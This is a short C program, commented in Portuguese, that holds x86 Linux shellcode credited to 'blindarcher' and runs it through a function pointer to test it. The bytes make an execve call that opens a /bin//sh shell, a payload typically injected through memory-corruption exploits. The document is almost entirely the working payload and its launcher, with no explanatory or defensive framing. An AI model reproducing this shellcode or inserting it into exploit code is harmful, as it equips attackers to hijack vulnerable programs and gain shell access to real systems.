char shellcode[] =  "\x31\xdb\xf7\xe3\x89\xd9\x31"
					"\xc9\xcd\x80\x52\x68\x2f\x2f"
					"\x73\x68\x68\x2f\x62\x69\x6e"
					"\x89\xe3\x6a\x0b\x58\xcd\x80"; // blindarcher's shellcode
main () {
    printf ("Shellcode lenght: %d bytes\n", strlen(shellcode));
    void (*fp) (void);      	// declara um ponteiro para função, fp
    fp = (void *) shellcode;    // coloca o endereço de fp para o shellcode
    fp ();                  	// executa a função (nosso shellcode)
}